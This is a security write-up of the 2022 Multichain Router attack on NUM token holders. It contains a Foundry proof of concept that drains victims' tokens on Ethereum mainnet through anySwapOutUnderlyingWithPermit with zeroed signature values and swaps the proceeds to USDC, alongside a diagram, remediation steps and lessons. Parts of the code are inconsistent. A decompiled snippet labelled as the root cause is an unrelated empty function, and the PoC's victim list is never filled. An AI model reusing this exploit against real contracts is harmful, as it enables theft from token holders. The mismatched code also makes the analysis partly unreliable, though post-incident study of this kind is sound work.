# NUM — Multichain anySwapOutUnderlyingWithPermit() Signature Verification Bypass Attack Analysis

| Field | Details |
|------|------|
| **Date** | 2022-11 |
| **Protocol** | NUM Token (Multichain Router) |
| **Chain** | Ethereum Mainnet |
| **Loss** | Victim's entire NUM token balance |
| **NUM Token** | [0x3496B523e5C00a4b4150D6721320CdDb234c3079](https://etherscan.io/address/0x3496B523e5C00a4b4150D6721320CdDb234c3079) |
| **USDC** | [0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48](https://etherscan.io/address/0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48) |
| **WETH** | [0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2](https://etherscan.io/address/0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2) |
| **Multichain Router** | [0x765277EebeCA2e31912C9946eAe1021199B39C61](https://etherscan.io/address/0x765277EebeCA2e31912C9946eAe1021199B39C61) |
| **Uniswap V3 Router** | [0x68b3465833fb72A70ecDF485E0e4C7bD8665Fc45](https://etherscan.io/address/0x68b3465833fb72A70ecDF485E0e4C7bD8665Fc45) |
| **Root Cause** | `anySwapOutUnderlyingWithPermit()` does not validate the EIP-2612 permit signature, allowing arbitrary victims' tokens to be bridged |
| **CWE** | CWE-347: Improper Verification of Cryptographic Signature |
| **PoC Source** | [DeFiHackLabs](https://github.com/SunWeb3Sec/DeFiHackLabs/blob/main/src/test/2022-11/NUM_exp.sol) |

---
## 1. Vulnerability Overview

The Multichain (formerly AnySwap) Router's `anySwapOutUnderlyingWithPermit()` function was designed to process EIP-2612 permit signatures, enabling users to execute cross-chain bridges without a separate `approve`. The vulnerability was that the `v`, `r`, `s` parameters of the permit signature were never actually validated. An attacker called the function specifying a victim address as `from` along with manipulated signature parameters (`v=0` or arbitrary values). The Multichain Router accepted the invalid signature and executed `NUM.transferFrom(victim, router, amount)`, draining the victim's entire NUM token balance.

---
## 2. Vulnerable Code Analysis

```solidity
// ❌ Vulnerable anySwapOutUnderlyingWithPermit() - no permit signature validation
contract MultichainRouter {
    function anySwapOutUnderlyingWithPermit(
        address from,      // ❌ Arbitrary victim address can be specified
        address token,
        address to,
        uint256 amount,
        uint256 deadline,
        uint8 v, bytes32 r, bytes32 s,  // ❌ Processed without signature validation
        uint256 toChainID
    ) external {
        // ❌ Does not verify that the permit signature was actually created by `from`
        // permit() call failure is ignored or execution proceeds unconditionally
        try IERC20Permit(token).permit(from, address(this), amount, deadline, v, r, s) {
            // Handle permit success
        } catch {
            // ❌ Ignores permit failure and continues
            // Handles case where `from` already has sufficient allowance
        }

        // ❌ transferFrom executes regardless of permit result
        assert(IERC20(token).transferFrom(from, address(this), amount));
        // Bridge processing...
    }
}

// ✅ Correct pattern - requires permit success as a precondition
contract SafeMultichainRouter {
    function anySwapOutUnderlyingWithPermit(
        address from,
        address token,
        address to,
        uint256 amount,
        uint256 deadline,
        uint8 v, bytes32 r, bytes32 s,
        uint256 toChainID
    ) external {
        // ✅ permit must succeed
        IERC20Permit(token).permit(from, address(this), amount, deadline, v, r, s);
        // If permit fails, reverts → cannot proceed with invalid signature

        // ✅ Re-verify that allowance is sufficient after permit
        require(
            IERC20(token).allowance(from, address(this)) >= amount,
            "Insufficient allowance"
        );

        assert(IERC20(token).transferFrom(from, address(this), amount));
    }
}
```

---
### On-Chain Original Code

Source: Bytecode decompilation


**NUM_decompiled.sol** — Entry point:
```solidity
// ❌ Root cause: `anySwapOutUnderlyingWithPermit()` does not validate the EIP-2612 permit signature, allowing arbitrary victims' tokens to be bridged
    function LOCK8605463013() external {}  // 0xffffffff
```

## 3. Attack Flow (ASCII Diagram)

```
Attacker
    │
    ├─[1] Victim reconnaissance
    │       Among NUM token holders, identify accounts that have not
    │       approved the Multichain Router or approved only a small amount
    │       (victims who require the permit path)
    │
    ├─[2] Call anySwapOutUnderlyingWithPermit(
    │         from     = victim,      ← victim address
    │         token    = NUM,
    │         to       = attacker,
    │         amount   = victimBalance,
    │         deadline = block.timestamp + 1,
    │         v=0, r=arbitrary, s=arbitrary  ← invalid signature
    │       )
    │       ❌ No permit signature validation
    │       → NUM.transferFrom(victim, router, amount) executes
    │
    ├─[3] Multichain holds NUM (pending bridge state)
    │       Attacker receives corresponding asset on another chain
    │       or directly recovers NUM
    │
    ├─[4] NUM → USDC (Uniswap V3)
    │
    └─[5] Net profit: USDC
```

---
## 4. PoC Code (Core Logic + Comments)

```solidity
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.10;

import "forge-std/Test.sol";

interface IMultichainRouter {
    // ❌ Bridge function without permit signature validation
    function anySwapOutUnderlyingWithPermit(
        address from,
        address token,
        address to,
        uint256 amount,
        uint256 deadline,
        uint8 v, bytes32 r, bytes32 s,
        uint256 toChainID
    ) external;
}

interface IUniV3Router {
    struct ExactInputSingleParams {
        address tokenIn; address tokenOut; uint24 fee;
        address recipient; uint256 deadline;
        uint256 amountIn; uint256 amountOutMinimum; uint160 sqrtPriceLimitX96;
    }
    function exactInputSingle(ExactInputSingleParams calldata) external returns (uint256);
}

interface IERC20 {
    function balanceOf(address) external view returns (uint256);
    function approve(address, uint256) external returns (bool);
}

contract NUMExploit is Test {
    IMultichainRouter router = IMultichainRouter(0x765277EebeCA2e31912C9946eAe1021199B39C61);
    IUniV3Router uniRouter   = IUniV3Router(0x68b3465833fb72A70ecDF485E0e4C7bD8665Fc45);
    IERC20 NUM  = IERC20(0x3496B523e5C00a4b4150D6721320CdDb234c3079);
    IERC20 USDC = IERC20(0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48);

    // List of victim addresses (large NUM holders)
    address[] victims;

    function setUp() public {
        vm.createSelectFork("mainnet", 16_029_969);
    }

    function testExploit() public {
        emit log_named_decimal_uint("[Start] USDC", USDC.balanceOf(address(this)), 6);

        for (uint256 i = 0; i < victims.length; i++) {
            address victim  = victims[i];
            uint256 balance = NUM.balanceOf(victim);
            if (balance == 0) continue;

            // ⚡ Drain victim's NUM via bridge path using invalid signature (v=0)
            router.anySwapOutUnderlyingWithPermit(
                victim,          // from: victim
                address(NUM),
                address(this),   // to: attacker
                balance,
                block.timestamp + 1,
                0,               // v = 0 (invalid)
                bytes32(0),      // r
                bytes32(0),      // s
                1                // toChainID (arbitrary)
            );
        }

        // Sell NUM → USDC (Uniswap V3)
        NUM.approve(address(uniRouter), type(uint256).max);
        uniRouter.exactInputSingle(IUniV3Router.ExactInputSingleParams({
            tokenIn:           address(NUM),
            tokenOut:          address(USDC),
            fee:               3000,
            recipient:         address(this),
            deadline:          block.timestamp,
            amountIn:          NUM.balanceOf(address(this)),
            amountOutMinimum:  0,
            sqrtPriceLimitX96: 0
        }));

        emit log_named_decimal_uint("[End] USDC", USDC.balanceOf(address(this)), 6);
    }
}
```

---
## 5. Vulnerability Classification (Table)

| Category | Details |
|------|-----------|
| **Vulnerability Type** | EIP-2612 permit signature verification bypass |
| **CWE** | CWE-347: Improper Verification of Cryptographic Signature |
| **OWASP DeFi** | Signature verification bypass |
| **Attack Vector** | `anySwapOutUnderlyingWithPermit(victim, NUM, attacker, balance, ..., v=0, r=0, s=0)` |
| **Precondition** | permit signature failure is ignored and transferFrom executes anyway |
| **Impact** | Victim's entire NUM token balance drained |

---
## 6. Remediation Recommendations

1. **Enforce permit result**: If the `permit()` call fails, revert immediately. Remove any `try/catch` pattern that silences failure.
2. **Re-verify allowance**: After `permit()`, re-confirm `allowance(from, router) >= amount`.
3. **Validate signature parameters**: Pre-validate that `v` is 27 or 28, and that `r` and `s` fall within valid ranges.

---
## 7. Lessons Learned

- **The try/catch trap with permit()**: The pattern of wrapping permit in a `try/catch` for convenience and falling back to the existing allowance on failure became the same vulnerability in both Multichain and Kashi/BentoBox. A permit failure must always revert the entire function.
- **Attack surface of cross-chain bridges**: Bridge contracts intermediate assets for users across multiple chains, creating a broad attack surface. In particular, for permit-based one-click bridges, signature validation is the core security requirement.
- **The wide-reaching impact of the Multichain vulnerability**: The same Multichain Router vulnerability applied not only to NUM but to multiple EIP-2612 compatible tokens. This illustrates the risk of shared infrastructure, where a single vulnerability can simultaneously affect many tokens.